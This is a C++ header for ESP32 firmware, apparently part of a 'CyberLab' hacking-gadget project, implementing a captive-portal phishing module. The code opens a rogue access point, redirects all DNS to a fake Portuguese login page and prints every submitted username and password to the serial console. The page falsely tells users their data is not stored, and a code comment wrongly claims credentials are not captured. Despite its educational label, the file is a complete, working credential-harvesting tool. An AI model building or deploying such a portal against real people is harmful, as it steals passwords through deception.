/*
 * ============================================================================
 * [NEV]² - NEV-OS CyberLab v3.0
 * module_wifi_captive.h - Captive portal (open AP with login page)
 *
 * ATENÇÃO: Use apenas para fins educacionais em ambiente controlado.
 * ============================================================================
 */
#pragma once

#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <TFT_eSPI.h>
#include "config.h"
#include "types.h"
#include "ui_helpers.h"

extern TFT_eSPI tft;
extern DNSServer dnsServer;
extern WebServer webServer;
extern AppState currentState;

// HTML page served by captive portal
const char CAPTIVE_INDEX[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head><title>NEV-OS Wi-Fi</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:sans-serif;background:#0a0a2a;color:#fff;margin:0;padding:20px;}
.box{max-width:360px;margin:40px auto;background:#1a1a4a;padding:30px;border-radius:8px;}
h1{color:#0ff;text-align:center;}
input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border-radius:4px;border:none;}
button{width:100%;padding:12px;background:#0c0;color:#000;border:none;border-radius:4px;font-weight:bold;}
small{color:#888;}
</style></head><body>
<div class="box">
<h1>[NEV]2 Wi-Fi</h1>
<p>Autentique-se para continuar:</p>
<form action="/login" method="GET">
<input name="user" placeholder="Usuario" required>
<input name="pass" type="password" placeholder="Senha" required>
<button type="submit">Conectar</button>
</form>
<p><small>Lab educacional - dados nao sao armazenados.</small></p>
</div></body></html>
)rawliteral";

const char CAPTIVE_LOGGED[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><title>OK</title></head>
<body style="font-family:sans-serif;background:#0a0;color:#fff;text-align:center;padding:60px;">
<h1>Conectado!</h1><p>Aguarde redirecionamento...</p></body></html>
)rawliteral";

inline void handleCaptiveRoot() {
  webServer.send(200, "text/html", CAPTIVE_INDEX);
}

inline void handleCaptiveLogin() {
  // For educational purposes; real phishing would capture credentials
  // We just acknowledge to teach the principle.
  String user = webServer.arg("user");
  String pass = webServer.arg("pass");
  Serial.printf("[CAPTIVE] user=%s pass=%s\n", user.c_str(), pass.c_str());
  webServer.send(200, "text/html", CAPTIVE_LOGGED);
}

inline void handleCaptiveNotFound() {
  // Redirect any request to root (captive portal behavior)
  webServer.sendHeader("Location", "http://192.168.4.1/");
  webServer.send(302, "text/plain", "");
}

inline void enterWifiCaptive() {
  currentState = STATE_WIFI_CAPTIVE;

  tft.fillScreen(COLOR_BG);
  drawHeader("Captive Portal", true);
  drawCenteredText("Subindo AP...", 80, COLOR_WARN, 1);
  drawStatusBar("Aguarde...");

  // Stop any existing wifi
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP);

  // Start AP open (no password)
  WiFi.softAP("NEV-OS Portal");
  delay(200);
  IPAddress IP = WiFi.softAPIP();
  Serial.print("AP IP: "); Serial.println(IP);

  // DNS server: respond to *all* queries with our IP (forces portal)
  dnsServer.start(53, "*", IP);

  // Web server
  webServer.on("/", HTTP_GET, handleCaptiveRoot);
  webServer.on("/login", HTTP_GET, handleCaptiveLogin);
  webServer.onNotFound(handleCaptiveNotFound);
  webServer.begin();

  // Redraw with info
  tft.fillScreen(COLOR_BG);
  drawHeader("Captive Portal ATIVO", true);

  drawPanel(20, 30, 280, 130);
  tft.setTextColor(COLOR_PRIMARY);
  tft.setTextSize(1);
  tft.setCursor(30, 45);
  tft.print("SSID: NEV-OS Portal");
  tft.setCursor(30, 65);
  tft.printf("IP: %d.%d.%d.%d", IP[0], IP[1], IP[2], IP[3]);
  tft.setCursor(30, 85);
  tft.print("DNS: respostas -> 192.168.4.1");
  tft.setCursor(30, 105);
  tft.print("Login: /  (qualquer site)");
  tft.setCursor(30, 125);
  tft.print("Senha: registrada no Serial");

  drawCenteredText("Conecte e abra qualquer site", 175, COLOR_TEXT, 1);
  drawStatusBar("Longo:parar e voltar  BACK:sair");
}

inline void exitWifiCaptive() {
  dnsServer.stop();
  webServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  Serial.println("[CAPTIVE] Stopped");
}

inline void handleCaptiveLoop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
